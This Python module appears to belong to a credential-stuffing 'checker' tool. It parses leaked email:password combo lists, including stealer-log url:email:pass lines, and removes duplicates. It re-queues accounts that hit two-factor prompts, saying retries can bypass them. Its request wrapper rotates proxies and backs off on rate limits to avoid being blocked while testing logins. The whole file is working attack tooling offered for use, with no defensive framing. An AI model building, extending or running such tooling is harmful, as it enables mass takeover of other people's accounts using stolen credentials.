"""
Smart Checker Wrapper
- Wraps every checker call with circuit breaker + error classifier + retry
- Auto-detects API changes and flags them
- Per-combo timeout enforcement
- 2FA retry queue management
- Smart combo parser (handles email:pass, email;pass, url:email:pass formats)
"""
import re
import time
import logging
import threading
from typing import Optional, Dict, Tuple, List
from core.resilience import CircuitBreakerRegistry, ErrorClassifier, retry_sync

logger = logging.getLogger(__name__)

# ── Smart Combo Parser ────────────────────────────────────────────────────────

_EMAIL_RE = re.compile(
    r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'
)

def parse_combo_line(line: str) -> Optional[Tuple[str, str]]:
    """
    Parse ANY combo format into (email, password).
    Handles:
      email:password
      email;password  
      email|password
      url:email:password  (log format)
      email:password:extra (take first two)
      email password (space separated)
      email\tpassword (tab separated)
    """
    line = line.strip()
    if not line or len(line) < 6:
        return None

    # Find email anywhere in the line first
    email_match = _EMAIL_RE.search(line)
    if not email_match:
        return None

    email = email_match.group().lower()
    rest  = line[email_match.end():]

    # Strip leading separator
    rest = rest.lstrip(':;| \t')

    if not rest:
        return None

    # Take everything up to next separator as password
    # But handle url:email:pass format (rest has colon from url before email)
    # If rest contains common separators, split on first one
    for sep in (':', ';', '|', '\t'):
        if sep in rest:
            password = rest.split(sep)[0].strip()
            if password:
                return email, password

    # No separator found — rest is the password
    password = rest.strip()
    if password:
        return email, password

    return None


def deduplicate_combos(combos: List[str]) -> Tuple[List[str], int]:
    """
    Remove duplicate combos (case-insensitive email, exact password).
    Returns (unique_combos, dupe_count).
    """
    seen   = set()
    unique = []
    dupes  = 0
    for line in combos:
        parsed = parse_combo_line(line)
        if not parsed:
            dupes += 1
            continue
        email, password = parsed
        key = f"{email.lower()}:{password}"
        if key in seen:
            dupes += 1
        else:
            seen.add(key)
            unique.append(f"{email}:{password}")
    return unique, dupes


# ── 2FA Retry Manager ─────────────────────────────────────────────────────────

class TwoFARetryManager:
    """
    Manages 2FA accounts for retry.
    2FA often means the user got a verification email — 
    retrying after 30-60s sometimes bypasses it.
    """
    _queue: Dict[str, List[Tuple[str, str, float, int]]] = {}  # session_id → [(email, pass, retry_after, attempts)]
    _lock  = threading.Lock()
    MAX_ATTEMPTS = 2
    RETRY_DELAY  = 45.0  # seconds

    @classmethod
    def add(cls, session_id: str, email: str, password: str):
        with cls._lock:
            if session_id not in cls._queue:
                cls._queue[session_id] = []
            cls._queue[session_id].append((
                email, password,
                time.time() + cls.RETRY_DELAY,
                0
            ))

    @classmethod
    def get_ready(cls, session_id: str) -> List[Tuple[str, str]]:
        """Return 2FA combos ready for retry."""
        with cls._lock:
            if session_id not in cls._queue:
                return []
            now   = time.time()
            ready = []
            remaining = []
            for email, pw, retry_after, attempts in cls._queue[session_id]:
                if now >= retry_after and attempts < cls.MAX_ATTEMPTS:
                    ready.append((email, pw))
                    # Keep with incremented attempt and new delay
                    remaining.append((email, pw, now + cls.RETRY_DELAY, attempts + 1))
                elif attempts >= cls.MAX_ATTEMPTS:
                    pass  # drop — max retries hit
                else:
                    remaining.append((email, pw, retry_after, attempts))
            cls._queue[session_id] = remaining
            return ready

    @classmethod
    def clear(cls, session_id: str):
        with cls._lock:
            cls._queue.pop(session_id, None)

    @classmethod
    def count(cls, session_id: str) -> int:
        with cls._lock:
            return len(cls._queue.get(session_id, []))


# ── Smart Request Wrapper ─────────────────────────────────────────────────────

class SmartRequest:
    """
    Wraps any HTTP request with:
    - Circuit breaker per endpoint domain
    - Automatic proxy rotation on failure
    - Error classification + smart retry
    - Response validation
    """

    def __init__(self, session, proxy_rotator=None, timeout: int = 20):
        self.session       = session
        self.proxy_rotator = proxy_rotator
        self.timeout       = timeout
        self._breakers: Dict[str, object] = {}

    def _get_breaker(self, domain: str):
        if domain not in self._breakers:
            from core.resilience import CircuitBreaker
            self._breakers[domain] = CircuitBreaker(
                name=domain, failure_threshold=8, recovery_timeout=60
            )
        return self._breakers[domain]

    def _extract_domain(self, url: str) -> str:
        try:
            from urllib.parse import urlparse
            return urlparse(url).netloc
        except Exception:
            return url[:50]

    def get(self, url: str, **kwargs) -> Optional[object]:
        domain  = self._extract_domain(url)
        breaker = self._get_breaker(domain)
        if not breaker.can_execute():
            logger.debug(f"Circuit open for {domain} — skipping request")
            return None

        proxy_url = None
        if self.proxy_rotator and self.proxy_rotator.count() > 0:
            p = self.proxy_rotator.get_next(domain=domain)
            if p:
                proxy_url = p.url()

        for attempt in range(3):
            try:
                kw = {'timeout': self.timeout}
                if proxy_url:
                    kw['proxies'] = {'http': proxy_url, 'https': proxy_url}
                kw.update(kwargs)

                t0   = time.monotonic()
                resp = self.session.get(url, **kw)
                ms   = (time.monotonic() - t0) * 1000

                breaker.record_success()
                if proxy_url and self.proxy_rotator:
                    self.proxy_rotator.mark_result(proxy_url, True, ms, domain)
                return resp

            except Exception as exc:
                err_type = ErrorClassifier.classify(exc)
                breaker.record_failure(err_type)
                if proxy_url and self.proxy_rotator:
                    self.proxy_rotator.mark_result(proxy_url, False, 0, domain)

                if err_type in ('proxy', 'network') and attempt < 2:
                    # Rotate proxy and retry
                    p = self.proxy_rotator.get_next(domain=domain) if self.proxy_rotator else None
                    proxy_url = p.url() if p else None
                    continue
                if err_type == 'rate_limit' and attempt < 2:
                    time.sleep(1.5 * (attempt + 1))
                    continue
                break

        return None

    def post(self, url: str, **kwargs) -> Optional[object]:
        domain  = self._extract_domain(url)
        breaker = self._get_breaker(domain)
        if not breaker.can_execute():
            return None

        proxy_url = None
        if self.proxy_rotator and self.proxy_rotator.count() > 0:
            p = self.proxy_rotator.get_next(domain=domain)
            if p:
                proxy_url = p.url()

        for attempt in range(3):
            try:
                kw = {'timeout': self.timeout}
                if proxy_url:
                    kw['proxies'] = {'http': proxy_url, 'https': proxy_url}
                kw.update(kwargs)

                t0   = time.monotonic()
                resp = self.session.post(url, **kw)
                ms   = (time.monotonic() - t0) * 1000

                breaker.record_success()
                if proxy_url and self.proxy_rotator:
                    self.proxy_rotator.mark_result(proxy_url, True, ms, domain)
                return resp

            except Exception as exc:
                err_type = ErrorClassifier.classify(exc)
                breaker.record_failure(err_type)
                if proxy_url and self.proxy_rotator:
                    self.proxy_rotator.mark_result(proxy_url, False, 0, domain)

                if err_type in ('proxy', 'network') and attempt < 2:
                    p = self.proxy_rotator.get_next(domain=domain) if self.proxy_rotator else None
                    proxy_url = p.url() if p else None
                    continue
                if err_type == 'rate_limit' and attempt < 2:
                    time.sleep(1.5 * (attempt + 1))
                    continue
                break

        return None
